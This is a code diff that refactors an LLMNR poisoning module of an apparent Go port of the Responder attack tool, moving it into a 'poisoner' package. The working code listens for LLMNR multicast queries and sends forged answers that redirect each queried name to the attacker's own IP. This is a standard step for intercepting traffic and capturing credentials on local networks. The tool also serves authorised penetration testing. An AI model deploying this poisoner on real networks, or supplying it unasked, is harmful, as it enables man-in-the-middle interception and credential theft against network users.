@@ -1,30 +1,30 @@
-package main
+package poisoner
 
 import (
 	"encoding/binary"
 	"fmt"
 	"net"
+
+	"go-responder/internal/core"
 )
 
 const llmnrMulticast = "224.0.0.252"
 const llmnrPort = 5355
 
-func poisonLLMNR(ifaceIP net.IP) {
-	iface, err := ifaceByIP(ifaceIP)
+func PoisonLLMNR(ifaceIP net.IP) {
+	iface, err := IfaceByIP(ifaceIP)
 	if err != nil {
-		logError("LLMNR ifaceByIP: %v", err)
+		core.LogError("LLMNR ifaceByIP: %v", err)
 		return
 	}
-
 	group := &net.UDPAddr{IP: net.ParseIP(llmnrMulticast), Port: llmnrPort}
 	conn, err := net.ListenMulticastUDP("udp4", iface, group)
 	if err != nil {
-		logError("LLMNR multicast listen — %v (need root?)", err)
+		core.LogError("LLMNR multicast listen — %v (need root?)", err)
 		return
 	}
 	defer conn.Close()
-
-	logInfo("LLMNR listening on %s (UDP %d, multicast %s)", ifaceIP, llmnrPort, llmnrMulticast)
+	core.LogInfo("LLMNR listening on %s (UDP %d, multicast %s)", ifaceIP, llmnrPort, llmnrMulticast)
 
 	buf := make([]byte, 512)
 	for {
@@ -33,45 +33,41 @@ func poisonLLMNR(ifaceIP net.IP) {
 			continue
 		}
 		pkt := buf[:n]
-		name := parseLLMNRQuery(pkt)
+		name := ParseLLMNRQuery(pkt)
 		if name == "" {
 			continue
 		}
-		logVerbose("LLMNR query: %s from %s", name, src)
-		if analyzeMode {
-			logInfo("[LLMNR] [Analyze] query for '%s' from %s", name, src)
+		core.LogVerbose("LLMNR query: %s from %s", name, src)
+		if core.AnalyzeMode {
+			core.LogInfo("[LLMNR] [Analyze] query for '%s' from %s", name, src)
 			continue
 		}
-		if !shouldRespond(src, name) {
-			logVerbose("LLMNR skipping '%s' from %s (filter)", name, src)
+		if !core.ShouldRespond(src, name) {
 			continue
 		}
-		resp := buildLLMNRResponse(pkt, ifaceIP)
+		resp := BuildLLMNRResponse(pkt, ifaceIP)
 		if resp != nil {
 			conn.WriteTo(resp, src)
-			logInfo("[LLMNR] Poisoned query for '%s' — responding with %s", name, ifaceIP)
+			core.LogInfo("[LLMNR] Poisoned query for '%s' — responding with %s", name, ifaceIP)
 		}
 	}
 }
 
-// parseLLMNRQuery extracts the queried name from an LLMNR query packet.
-func parseLLMNRQuery(pkt []byte) string {
+func ParseLLMNRQuery(pkt []byte) string {
 	if len(pkt) < 12 {
 		return ""
 	}
 	flags := binary.BigEndian.Uint16(pkt[2:4])
-	if flags&0x8000 != 0 { // QR bit set = response
+	if flags&0x8000 != 0 {
 		return ""
 	}
-	qdCount := binary.BigEndian.Uint16(pkt[4:6])
-	if qdCount == 0 {
+	if binary.BigEndian.Uint16(pkt[4:6]) == 0 {
 		return ""
 	}
-	return decodeDNSName(pkt, 12)
+	return DecodeDNSName(pkt, 12)
 }
 
-// decodeDNSName reads a DNS label-encoded name starting at offset.
-func decodeDNSName(pkt []byte, off int) string {
+func DecodeDNSName(pkt []byte, off int) string {
 	var name []byte
 	for off < len(pkt) {
 		l := int(pkt[off])
@@ -91,13 +87,11 @@ func decodeDNSName(pkt []byte, off int) string {
 	return string(name)
 }
 
-// buildLLMNRResponse constructs an LLMNR response pointing to our IP.
-func buildLLMNRResponse(query []byte, ip net.IP) []byte {
+func BuildLLMNRResponse(query []byte, ip net.IP) []byte {
 	if len(query) < 12 {
 		return nil
 	}
 	txID := query[0:2]
-
 	qStart := 12
 	qEnd := qStart
 	for qEnd < len(query) {
@@ -112,33 +106,30 @@ func buildLLMNRResponse(query []byte, ip net.IP) []byte {
 		return nil
 	}
 	qType := binary.BigEndian.Uint16(query[qEnd : qEnd+2])
-	if qType != 1 && qType != 255 { // A or ANY
+	if qType != 1 && qType != 255 {
 		return nil
 	}
 	qEnd += 4
-
 	question := query[qStart:qEnd]
 
 	var resp []byte
 	resp = append(resp, txID...)
-	resp = append(resp, 0x80, 0x00) // QR=1, authoritative
-	resp = append(resp, 0x00, 0x01) // QDCOUNT=1
-	resp = append(resp, 0x00, 0x01) // ANCOUNT=1
-	resp = append(resp, 0x00, 0x00) // NSCOUNT
-	resp = append(resp, 0x00, 0x00) // ARCOUNT
+	resp = append(resp, 0x80, 0x00)
+	resp = append(resp, 0x00, 0x01)
+	resp = append(resp, 0x00, 0x01)
+	resp = append(resp, 0x00, 0x00)
+	resp = append(resp, 0x00, 0x00)
 	resp = append(resp, question...)
-	resp = append(resp, 0xC0, 0x0C) // name pointer
-	resp = append(resp, 0x00, 0x01) // TYPE A
-	resp = append(resp, 0x00, 0x01) // CLASS IN
-	resp = append(resp, 0x00, 0x00, 0x00, 0x1E) // TTL 30s
-	resp = append(resp, 0x00, 0x04)              // RDLENGTH
+	resp = append(resp, 0xC0, 0x0C)
+	resp = append(resp, 0x00, 0x01)
+	resp = append(resp, 0x00, 0x01)
+	resp = append(resp, 0x00, 0x00, 0x00, 0x1E)
+	resp = append(resp, 0x00, 0x04)
 	resp = append(resp, ip.To4()...)
-
 	return resp
 }
 
-// ifaceByIP finds the network interface that has the given IP.
-func ifaceByIP(ip net.IP) (*net.Interface, error) {
+func IfaceByIP(ip net.IP) (*net.Interface, error) {
 	ifaces, err := net.Interfaces()
 	if err != nil {
 		return nil, err
